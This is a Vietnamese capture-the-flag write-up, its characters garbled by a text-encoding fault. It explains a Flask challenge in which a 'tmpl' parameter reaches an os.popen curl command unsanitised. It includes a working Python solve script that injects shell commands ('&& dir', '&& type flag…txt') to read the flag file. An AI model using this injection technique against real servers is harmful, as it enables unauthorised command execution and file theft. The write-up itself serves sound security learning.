
![image](https://github.com/user-attachments/assets/5e5376be-2196-47fa-ba83-f091a8b23d3b)

Äáº§u tiÃªn thÃ¬ trong file server.py

ÄÃ¢y lÃ  má»™t á»©ng dá»¥ng web Flask.
ÄÆ°á»ng dáº«n /: Phá»¥c vá»¥ static/index.html.
ÄÆ°á»ng dáº«n /static:
Phá»¥c vá»¥ cÃ¡c file tÄ©nh, Ä‘áº·c biá»‡t lÃ  cÃ¡c file .tmpl.
NÃ³ kiá»ƒm tra xem fpath Ä‘Æ°á»£c yÃªu cáº§u cÃ³ tá»“n táº¡i trong thÆ° má»¥c static vÃ  káº¿t thÃºc báº±ng .tmpl hay khÃ´ng. Náº¿u khÃ´ng, nÃ³ máº·c Ä‘á»‹nh lÃ  ğŸˆ.tmpl.
CÃ³ má»™t kiá»ƒm tra vá» "quÃ¡ nhiá»u biá»ƒu tÆ°á»£ng cáº£m xÃºc" (cÃ¡c kÃ½ tá»± cÃ³ ord(c) > 127) trong URL.

![image](https://github.com/user-attachments/assets/09d51cda-72af-4fca-95eb-409d606bd03f)

ÄÆ°á»ng dáº«n /ti-84: ÄÃ¢y lÃ  trá»ng tÃ¢m cá»§a thá»­ thÃ¡ch.
NÃ³ nháº­n hai tham sá»‘: code vÃ  tmpl.
Tham sá»‘ code:
CÃ³ giá»›i háº¡n Ä‘á»™ dÃ i (len(code) > 3) vÃ  kiá»ƒm tra sá»± hiá»‡n diá»‡n cá»§a cÃ¡c chá»¯ sá»‘ vÃ  cÃ¡c toÃ¡n tá»­ sá»‘ há»c cÆ¡ báº£n (0-9+-*/). Náº¿u cÃ¡c Ä‘iá»u kiá»‡n nÃ y Ä‘Æ°á»£c Ä‘Ã¡p á»©ng, nÃ³ sáº½ tráº£ vá» lá»—i. Äiá»u nÃ y cho tháº¥y cÃ¡c biá»ƒu thá»©c toÃ¡n há»c trá»±c tiáº¿p khÃ´ng pháº£i lÃ  cÃ¡ch khai thÃ¡c Ä‘Æ°á»£c mong muá»‘n.
code Ä‘Æ°á»£c chÃ¨n vÃ o code_tmpl.py.
Tham sá»‘ tmpl:
Tham sá»‘ nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¢y dá»±ng má»™t lá»‡nh curl.exe Ä‘á»ƒ tÃ¬m náº¡p file máº«u tá»« Ä‘iá»ƒm cuá»‘i /static.
Máº«u Ä‘Ã£ tÃ¬m náº¡p (out_tmpl) pháº£i chá»©a {{out}}, náº¿u khÃ´ng, lá»—i sáº½ Ä‘Æ°á»£c tráº£ vá».
Thá»±c thi mÃ£:
code_tmpl Ä‘Ã£ sá»­a Ä‘á»•i (vá»›i code do ngÆ°á»i dÃ¹ng cung cáº¥p) Ä‘Æ°á»£c ghi vÃ o má»™t file Python táº¡m thá»i (tmpfile.py).
file táº¡m thá»i nÃ y sau Ä‘Ã³ Ä‘Æ°á»£c thá»±c thi báº±ng python.exe.
Äáº§u ra chuáº©n (stdout) vÃ  lá»—i chuáº©n (stderr) cá»§a táº­p lá»‡nh Python Ä‘Æ°á»£c thá»±c thi Ä‘Æ°á»£c ghi láº¡i.
Cuá»‘i cÃ¹ng: result Ä‘Ã£ ghi láº¡i (Ä‘áº§u ra tá»« táº­p lá»‡nh Python Ä‘Æ°á»£c thá»±c thi) sau Ä‘Ã³ Ä‘Æ°á»£c thay tháº¿ vÃ o out_tmpl Ä‘Ã£ tÃ¬m náº¡p táº¡i chá»— giá»¯ chá»— {{out}}

Tiáº¿p theo lÃ  file code_tmpl.py

file nÃ y Ä‘Ã³ng vai trÃ² lÃ  máº«u cho mÃ£ Python sáº½ Ä‘Æ°á»£c thá»±c thi.
NÃ³ sá»­ dá»¥ng RestrictedPython.compile_restricted Ä‘á»ƒ biÃªn dá»‹ch code do ngÆ°á»i dÃ¹ng cung cáº¥p.
byte_code Ä‘Ã£ biÃªn dá»‹ch sau Ä‘Ã³ Ä‘Æ°á»£c thá»±c thi báº±ng eval.
Quan trá»ng lÃ , __builtins__ Ä‘Æ°á»£c Ä‘áº·t rÃµ rÃ ng thÃ nh má»™t tá»« Ä‘iá»ƒn trá»‘ng {}, Ä‘iá»u nÃ y háº¡n cháº¿ nghiÃªm ngáº·t cÃ¡c hÃ m vÃ  Ä‘á»‘i tÆ°á»£ng cÃ³ thá»ƒ Ä‘Æ°á»£c truy cáº­p bá»Ÿi mÃ£ Ä‘Æ°á»£c thá»±c thi. ÄÃ¢y lÃ  má»™t cÆ¡ cháº¿ sandbox.

![image](https://github.com/user-attachments/assets/06ad1bb2-7a7c-439f-894f-1aa3f252cc60)

Äáº§u tiÃªn lÃ  file solve.py

```
import requests
import sys

target = sys.argv[1]
target = target.replace("http://", "").replace("https://", "")
target = "http://" + target


def exploit(cmd):
    return requests.get(target + "/ti-84", params={
        "code": "1+1",
        "tmpl": f"ğŸˆ.tmpl && {cmd} && echo "
    }).text

flag_path = exploit("dir").split("flag")[1].split(".txt")[0].strip()
flag_path = "flag" + flag_path + ".txt"
flag = exploit(f"type {flag_path}").split(".;,;.")[1].split("}")[0].strip()
print(f"Flag: .;,;.{flag}}}")
```

Táº­p lá»‡nh nÃ y thá»ƒ hiá»‡n má»™t lá»— há»•ng chÃ¨n lá»‡nh cÆ¡ báº£n.
NÃ³ nháº¯m má»¥c tiÃªu Ä‘iá»ƒm cuá»‘i /ti-84.
Tham sá»‘ tmpl Ä‘Æ°á»£c táº¡o Ä‘á»ƒ chÃ¨n cÃ¡c lá»‡nh báº±ng cÃ¡ch sá»­ dá»¥ng && vÃ  echo Ä‘á»ƒ trÃ­ch xuáº¥t thÃ´ng tin.
Äáº§u tiÃªn, nÃ³ sá»­ dá»¥ng dir Ä‘á»ƒ tÃ¬m tÃªn file flag (giáº£ sá»­ nÃ³ chá»©a "flag" vÃ  káº¿t thÃºc báº±ng ".txt").
Sau Ä‘Ã³, nÃ³ sá»­ dá»¥ng type Ä‘á»ƒ Ä‘á»c ná»™i dung cá»§a file flag.
Lá»— há»•ng á»Ÿ Ä‘Ã¢y náº±m á»Ÿ cÃ¡ch output_tmpl Ä‘Æ°á»£c sá»­ dá»¥ng trong lá»‡nh gá»i os.popen trong server.py mÃ  khÃ´ng cÃ³ sá»± lÃ m sáº¡ch thÃ­ch há»£p, 
cho phÃ©p chÃ¨n lá»‡nh thÃ´ng qua tham sá»‘ tmpl. Cá»¥ thá»ƒ, os.popen(f"curl.exe -s {url}").read() láº¥y url, bao gá»“m output_tmpl do ngÆ°á»i dÃ¹ng kiá»ƒm soÃ¡t, 
cho phÃ©p chÃ¨n lá»‡nh náº¿u output_tmpl chá»©a cÃ¡c kÃ½ tá»± meta cá»§a shell.

![image](https://github.com/user-attachments/assets/2857eb43-9843-4349-8c12-7b7d0e5e8b17)

Cháº¡y file lÃ  ra Ä‘Æ°á»£c flag

